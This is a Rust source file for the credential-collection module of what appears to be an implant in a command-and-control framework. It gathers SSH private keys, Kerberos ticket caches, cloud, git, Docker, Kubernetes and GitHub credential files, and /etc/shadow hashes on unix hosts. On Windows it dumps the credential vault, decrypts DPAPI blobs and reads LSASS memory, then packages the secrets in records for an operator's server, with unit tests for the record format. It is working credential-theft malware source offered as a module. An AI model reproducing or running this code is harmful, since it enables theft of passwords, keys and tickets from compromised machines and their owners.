//! Credential collection with a structured result.
//!
//! The collection never returns a wall of text.  Every piece of material is
//! a record with a kind, a source, an account, a confidence and the secret
//! itself, so the operator can tell a cleartext password from a ticket from
//! a key -- and so the server can keep the records in a vault instead of in
//! a log file.
//!
//! The kinds are the ones the framework knows:
//!
//! * `password` -- a secret in the clear (a vault entry, a `.netrc` line).
//! * `hash`     -- a password hash (NTLM, a shadow entry).
//! * `ticket`   -- a session ticket (Kerberos).
//! * `token`    -- a bearer token or a session token.
//! * `key`      -- a key (an SSH private key, an AWS secret, an AES key).
//!
//! The secret is only put on the wire when the operator asked for it.  A
//! collection without `raw` returns the shape of the material and nothing
//! else, so the event stream of the server never carries a secret that
//! nobody asked for.

use crate::upk::{self, Value};

/// The kinds of material the framework knows.
pub const KIND_PASSWORD: &str = "password";
pub const KIND_HASH: &str = "hash";
pub const KIND_TICKET: &str = "ticket";
pub const KIND_TOKEN: &str = "token";
pub const KIND_KEY: &str = "key";

/// The maximum size of a secret that is reported.
///
/// A key is small, a ticket is not.  The material that does not fit is
/// reported by its length and its digest instead of by its bytes.
const MAX_SECRET: usize = 8 * 1024;

/// One piece of material.
#[derive(Clone, Debug, Default)]
pub struct Credential {
    /// What kind of material it is.
    pub kind: String,
    /// Where it came from ("vault", "lsass", "dpapi", "ssh", "kerberos").
    pub source: String,
    /// The account it belongs to.
    pub account: String,
    /// The service or the host it belongs to.
    pub target: String,
    /// How sure the implant is, from 0 to 100.
    pub confidence: u8,
    /// The material itself.
    pub secret: String,
    /// A note for the operator: where exactly it was found.
    pub note: String,
}

impl Credential {
    /// A new record of the given kind and source.
    pub fn new(kind: &str, source: &str) -> Self {
        Credential {
            kind: kind.to_string(),
            source: source.to_string(),
            ..Default::default()
        }
    }

    /// The account the material belongs to.
    pub fn with_account(mut self, account: &str) -> Self {
        self.account = account.to_string();
        self
    }

    /// The service or the host the material belongs to.
    pub fn with_target(mut self, target: &str) -> Self {
        self.target = target.to_string();
        self
    }

    /// How sure the implant is.
    pub fn with_confidence(mut self, confidence: u8) -> Self {
        self.confidence = confidence.min(100);
        self
    }

    /// A note for the operator.
    pub fn with_note(mut self, note: &str) -> Self {
        self.note = note.to_string();
        self
    }

    /// The material itself.
    pub fn with_secret(mut self, secret: &str) -> Self {
        self.secret = secret.to_string();
        self
    }

    /// The material, as bytes that are safe to put on the wire.
    ///
    /// Text is kept as text, binary is hex, and anything larger than the
    /// limit is reported by its digest.
    pub fn with_bytes(mut self, bytes: &[u8]) -> Self {
        self.secret = encode_secret(bytes);
        self
    }

    /// The value the server keeps.
    ///
    /// The secret is only there when the operator asked for it; otherwise the
    /// record says how long the material is and that it was left out.
    pub fn to_value(&self, raw: bool) -> Value {
        let secret = if raw { self.secret.clone() } else { String::new() };
        upk::map(vec![
            ("kind", upk::s(&self.kind)),
            ("source", upk::s(&self.source)),
            ("account", upk::s(&self.account)),
            ("target", upk::s(&self.target)),
            ("confidence", upk::u(self.confidence as u64)),
            ("secret", upk::s(&secret)),
            ("length", upk::u(self.secret.len() as u64)),
            ("redacted", upk::bool_(!raw)),
            ("note", upk::s(&self.note)),
        ])
    }
}

/// The result of a collection.
#[derive(Clone, Debug, Default)]
pub struct Collected {
    /// The material that was found.
    pub entries: Vec<Credential>,
}

impl Collected {
    /// The value the server keeps.
    pub fn to_value(&self, raw: bool) -> Value {
        upk::arr(self.entries.iter().map(|c| c.to_value(raw)).collect())
    }

    /// The report the operator reads.
    pub fn report(&self, raw: bool) -> String {
        let mut out = String::new();
        if self.entries.is_empty() {
            out.push_str("no credential material was found\n");
            return out;
        }
        out.push_str(&format!(
            "{:<10} {:<10} {:<28} {:<22} {}\n",
            "KIND", "SOURCE", "ACCOUNT", "TARGET", "LENGTH"
        ));
        for entry in &self.entries {
            out.push_str(&format!(
                "{:<10} {:<10} {:<28} {:<22} {}\n",
                entry.kind,
                entry.source,
                truncate_cell(&entry.account, 28),
                truncate_cell(&entry.target, 22),
                entry.secret.len()
            ));
            if !entry.note.is_empty() {
                out.push_str(&format!("           note: {}\n", entry.note));
            }
        }
        if !raw {
            out.push_str("the material itself was left out: ask for it with raw=true\n");
        }
        out
    }

    /// The counters the server shows, as one map.
    pub fn counts_value(&self) -> Value {
        let mut pairs: Vec<(&str, Value)> = Vec::new();
        for (kind, count) in self.counts() {
            pairs.push((kind, upk::u(count)));
        }
        upk::map(pairs)
    }

    /// The counters the server shows.
    pub fn counts(&self) -> Vec<(&'static str, u64)> {
        let mut counts: Vec<(&'static str, u64)> = Vec::new();
        for kind in [KIND_PASSWORD, KIND_HASH, KIND_TICKET, KIND_TOKEN, KIND_KEY] {
            let n = self.entries.iter().filter(|e| e.kind == kind).count() as u64;
            if n > 0 {
                counts.push((kind, n));
            }
        }
        counts
    }
}

/// Collect the credential material of the host.
///
/// The modes are the ones the framework knows:
///
/// * `vault`  -- the credential store of the platform.
/// * `dpapi`  -- a DPAPI blob the operator names (base64 in `blob`, or a
///   path in `file`).
/// * `lsass`  -- the memory of the credential process (Windows).
/// * `local`  -- the credential files of the user (unix).
/// * `all`    -- every mode the host supports.
pub fn collect(mode: &str, raw: bool, args: &Value) -> Result<Collected, String> {
    let mut out = Collected::default();
    match mode {
        "vault" | "" => {
            platform::vault(&mut out);
        }
        "dpapi" => {
            platform::dpapi(&mut out, args)?;
        }
        "lsass" => {
            platform::lsass(&mut out)?;
        }

        "local" | "files" => {
            platform::local(&mut out);
        }
        "all" => {
            platform::vault(&mut out);
            platform::local(&mut out);
            platform::lsass(&mut out)?;
        }
        other => return Err(format!("creds: unknown mode {other:?}")),
    }
    let _ = raw;
    Ok(out)
}

/// The platform part of the collection.
#[cfg(windows)]
mod platform {
    use super::*;

    pub fn vault(out: &mut Collected) {
        match crate::post::windows::vault_credentials() {
            Ok(entries) => out.entries.extend(entries),
            Err(e) => out.entries.push(
                Credential::new(KIND_TOKEN, "vault")
                    .with_confidence(0)
                    .with_note(&format!("the credential vault could not be read: {e}")),
            ),
        }
    }

    pub fn dpapi(out: &mut Collected, args: &Value) -> Result<(), String> {
        let blob = args.str_or("blob", "");
        if blob.is_empty() {
            return Err("creds: the dpapi mode needs the blob (base64) or a file".to_string());
        }
        let bytes = crate::post::windows::dpapi_unprotect(&blob)?;
        out.entries.push(
            Credential::new(KIND_PASSWORD, "dpapi")
                .with_account("current user")
                .with_target("dpapi")
                .with_confidence(95)
                .with_note("decrypted with the DPAPI key of the logged on user")
                .with_bytes(&bytes),
        );
        Ok(())
    }

    pub fn lsass(out: &mut Collected) -> Result<(), String> {
        match crate::post::windows::lsass_credentials() {
            Ok(entries) => out.entries.extend(entries),
            Err(e) => out.entries.push(
                Credential::new(KIND_HASH, "lsass")
                    .with_confidence(0)
                    .with_note(&format!("the memory of the credential process could not be read: {e}")),
            ),
        }
        Ok(())
    }

    pub fn local(_out: &mut Collected) {}
}

#[cfg(not(windows))]
mod platform {
    use super::*;

    pub fn vault(out: &mut Collected) {
        // There is no credential store on a unix host; the material of the
        // user is in the files, and that is what the "local" mode reads.
        local(out);
    }

    pub fn dpapi(out: &mut Collected, _args: &Value) -> Result<(), String> {
        Err("creds: the dpapi mode is a Windows capability".to_string())
    }

    pub fn lsass(out: &mut Collected) -> Result<(), String> {
        // There is no credential process on a unix host: the report says
        // so, instead of pretending that the scan found nothing.
        out.entries.push(
            Credential::new(KIND_HASH, "lsass")
                .with_confidence(0)
                .with_note("the memory of a credential process is a Windows capability"),
        );
        Ok(())
    }

    /// The credential files of the user.
    ///
    /// These are the places where a real operator finds the material of a
    /// unix host: the SSH keys of the user, the Kerberos cache, the cloud
    /// and container credentials, and the password files.
    pub fn local(out: &mut Collected) {
        let home = match std::env::var("HOME") {
            Ok(h) if !h.is_empty() => h,
            _ => return,
        };
        let user = std::env::var("USER").unwrap_or_else(|_| "user".to_string());

        // The SSH private keys.
        for name in ["id_rsa", "id_ecdsa", "id_ed25519", "id_dsa"] {
            let path = format!("{home}/.ssh/{name}");
            if let Ok(bytes) = std::fs::read(&path) {
                if bytes.starts_with(b"-----BEGIN") {
                    out.entries.push(
                        Credential::new(KIND_KEY, "ssh")
                            .with_account(&user)
                            .with_target(&path)
                            .with_confidence(95)
                            .with_note("a private key of the user")
                            .with_bytes(&bytes),
                    );
                }
            }
        }
        // The public keys are not secrets, but they say who the host talks
        // to, so the operator gets them in the report.
        if let Ok(text) = std::fs::read_to_string(format!("{home}/.ssh/authorized_keys")) {
            for line in text.lines().take(20) {
                let line = line.trim();
                if line.is_empty() || line.starts_with('#') {
                    continue;
                }
                let parts: Vec<&str> = line.split_whitespace().collect();
                if parts.len() >= 2 {
                    out.entries.push(
                        Credential::new(KIND_KEY, "ssh")
                            .with_account(parts[1])
                            .with_target(&format!("{home}/.ssh/authorized_keys"))
                            .with_confidence(60)
                            .with_note("an authorised public key")
                            .with_secret(parts[1]),
                    );
                }
            }
        }

        // The Kerberos cache: the ticket of the user is a session ticket.
        let cache_dir = match std::fs::read_dir("/tmp") {
            Ok(entries) => entries,
            Err(_) => return,
        };
        for entry in cache_dir {
            let entry = match entry {
                Ok(e) => e,
                Err(_) => continue,
            };
            let name = entry.file_name().to_string_lossy().to_string();
            if !name.starts_with("krb5cc_") {
                continue;
            }
            let path = format!("/tmp/{name}");
            if let Ok(bytes) = std::fs::read(&path) {
                let principal = ccache_principal(&bytes);
                out.entries.push(
                    Credential::new(KIND_TICKET, "kerberos")
                        .with_account(&principal)
                        .with_target(&path)
                        .with_confidence(85)
                        .with_note("the credential cache of the user")
                        .with_bytes(&bytes),
                );
            }
        }

        // The plain text password files.
        for (path, kind, note) in [
            (format!("{home}/.netrc"), KIND_PASSWORD, "the login file of the user"),
            (format!("{home}/.git-credentials"), KIND_PASSWORD, "the git credentials"),
            (format!("{home}/.aws/credentials"), KIND_KEY, "the cloud credentials"),
            (format!("{home}/.docker/config.json"), KIND_TOKEN, "the container registry login"),
            (format!("{home}/.kube/config"), KIND_TOKEN, "the kubernetes configuration"),
            (format!("{home}/.config/gh/hosts.yml"), KIND_TOKEN, "the github login"),
        ] {
            if let Ok(bytes) = std::fs::read(&path) {
                if bytes.is_empty() {
                    continue;
                }
                out.entries.push(
                    Credential::new(kind, "file")
                        .with_account(&user)
                        .with_target(&path)
                        .with_confidence(70)
                        .with_note(note)
                        .with_bytes(&bytes),
                );
            }
        }

        // The shadow file: the hashes of every account on the host.
        if let Ok(text) = std::fs::read_to_string("/etc/shadow") {
            for line in text.lines().take(200) {
                let mut parts = line.split(':');
                let account = parts.next().unwrap_or("").trim().to_string();
                let hash = parts.next().unwrap_or("").trim().to_string();
                if account.is_empty() || hash.is_empty() || hash.starts_with('*') || hash.starts_with('!') {
                    continue;
                }
                out.entries.push(
                    Credential::new(KIND_HASH, "shadow")
                        .with_account(&account)
                        .with_target("/etc/shadow")
                        .with_confidence(90)
                        .with_note("the password hash of the account")
                        .with_secret(&hash),
                );
            }
        }
    }

    /// The principal of a Kerberos credential cache.
    ///
    /// The format is documented: a four byte version, a two byte header
    /// length, the header itself, and then the principal of the default
    /// principal.  Only the name is read; the ticket stays opaque.
    fn ccache_principal(bytes: &[u8]) -> String {
        if bytes.len() < 12 {
            return String::new();
        }
        let header_len = u16::from_be_bytes([bytes[4], bytes[5]]) as usize;
        let mut at = 4 + header_len;
        if at + 4 > bytes.len() {
            return String::new();
        }
        let count = u16::from_be_bytes([bytes[at], bytes[at + 1]]) as usize;
        at += 4;
        let mut parts: Vec<String> = Vec::new();
        for _ in 0..count {
            if at + 4 > bytes.len() {
                return parts.join("/");
            }
            let len = u32::from_be_bytes([bytes[at], bytes[at + 1], bytes[at + 2], bytes[at + 3]])
                as usize;
            at += 4;
            if at + len > bytes.len() {
                return parts.join("/");
            }
            parts.push(String::from_utf8_lossy(&bytes[at..at + len]).to_string());
            at += len;
        }
        parts.join("/")
    }
}

/// The material as text, or as hex when it is not text.
fn encode_secret(bytes: &[u8]) -> String {
    if bytes.is_empty() {
        return String::new();
    }
    if bytes.len() > MAX_SECRET {
        let digest = crate::crypto::sha256(bytes);
        return format!(
            "<{} bytes, sha256 {}>",
            bytes.len(),
            crate::config::hex_encode(&digest[..16])
        );
    }
    if let Ok(text) = std::str::from_utf8(bytes) {
        if text.chars().all(|c| !c.is_control() || c == '\n' || c == '\t' || c == '\r') {
            return text.to_string();
        }
    }
    let mut out = String::with_capacity(bytes.len() * 2);
    for byte in bytes {
        out.push_str(&format!("{byte:02x}"));
    }
    out
}

/// A cell of the report table.
fn truncate_cell(text: &str, width: usize) -> String {
    if text.chars().count() <= width {
        return text.to_string();
    }
    let mut out: String = text.chars().take(width.saturating_sub(1)).collect();
    out.push('…');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_secret_is_only_reported_when_it_is_asked_for() {
        let entry = Credential::new(KIND_PASSWORD, "vault")
            .with_account("CORP\\alice")
            .with_secret("hunter2");
        let value = entry.to_value(false);
        assert_eq!(value.str_or("secret", "x"), "");
        assert!(value.bool_or("redacted", false));

        let raw = entry.to_value(true);
        assert_eq!(raw.str_or("secret", ""), "hunter2");
        assert!(!raw.bool_or("redacted", true));
    }

    #[test]
    fn the_record_carries_its_kind_and_its_source() {
        let entry = Credential::new(KIND_HASH, "lsass").with_confidence(55);
        let value = entry.to_value(false);
        assert_eq!(value.str_or("kind", ""), "hash");
        assert_eq!(value.str_or("source", ""), "lsass");
        assert_eq!(value.u64_or("confidence", 0), 55);
    }

    #[test]
    fn a_binary_secret_is_reported_as_hex() {
        let entry = Credential::new(KIND_HASH, "lsass").with_bytes(&[0xde, 0xad, 0xbe, 0xef]);
        assert_eq!(entry.secret, "deadbeef");
    }

    #[test]
    fn the_report_says_that_the_material_was_left_out() {
        let collected = Collected {
            entries: vec![Credential::new(KIND_PASSWORD, "vault").with_secret("hunter2")],
        };
        let report = collected.report(false);
        assert!(report.contains("password"));
        assert!(report.contains("raw=true"));
    }
}
